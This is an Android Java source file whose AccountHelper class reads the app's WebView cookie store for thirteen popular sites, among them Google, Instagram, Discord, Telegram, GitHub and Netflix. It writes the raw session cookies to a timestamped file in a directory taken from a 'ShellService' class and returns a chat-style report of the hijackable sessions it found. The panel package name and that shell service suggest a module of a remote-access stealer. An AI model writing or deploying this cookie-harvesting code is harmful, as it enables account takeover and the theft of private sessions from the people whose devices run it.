package com.java.panel;

import android.content.Context;
import android.webkit.CookieManager;
import android.webkit.WebView;
import java.io.File;
import java.io.FileOutputStream;

public class AccountHelper {

    public static String getAccounts(Context context) {
        try {
            try {
                new WebView(context);
            } catch (Exception ignored) {}

            CookieManager cookieManager = CookieManager.getInstance();
            if (cookieManager == null) {
                return "📭 CookieManager is not available.";
            }
            cookieManager.setAcceptCookie(true);

            String[] targetUrls = {
                "https://google.com",
                "https://youtube.com",
                "https://instagram.com",
                "https://twitter.com",
                "https://facebook.com",
                "https://discord.com",
                "https://telegram.org",
                "https://github.com",
                "https://netflix.com",
                "https://tiktok.com",
                "https://reddit.com",
                "https://spotify.com",
                "https://twitch.tv"
            };

            StringBuilder fullReport = new StringBuilder("╭───『 🍪 Web Cookies Report 』───╮\n\n");
            StringBuilder fileContent = new StringBuilder("=== WEB COOKIES REPORT ===\n\n");
            int foundCount = 0;

            for (String url : targetUrls) {
                String cookies = cookieManager.getCookie(url);
                if (cookies != null && !cookies.trim().isEmpty()) {
                    foundCount++;
                    String domainName = url.replace("https://", "").replace("http://", "");
                    
                    fullReport.append("  🌐 **Domain:** `").append(domainName).append("`\n");
                    fullReport.append("    └ **Status:** `Active Session Found`\n\n");

                    fileContent.append("--------------------------------------------------\n");
                    fileContent.append("Domain: ").append(domainName).append("\n");
                    fileContent.append("Cookies:\n").append(cookies).append("\n\n");
                }
            }

            if (foundCount == 0) {
                return "📭 No active cookies found for target domains.";
            }

            String filePath = ShellService.TARGET_DIR + "cookies_" + System.currentTimeMillis() + ".txt";
            File file = new File(filePath);
            FileOutputStream fos = new FileOutputStream(file);
            fos.write(fileContent.toString().getBytes());
            fos.close();

            fullReport.append("📊 **Found Domains:** `").append(foundCount).append("`\n");
            fullReport.append("💾 **Saved to File:** `").append(filePath).append("`\n");
            fullReport.append("╰────────────────────────╯");

            return fullReport.toString();
        } catch (Exception e) {
            return "❌ Error while fetching cookies: " + e.getMessage();
        }
    }
}
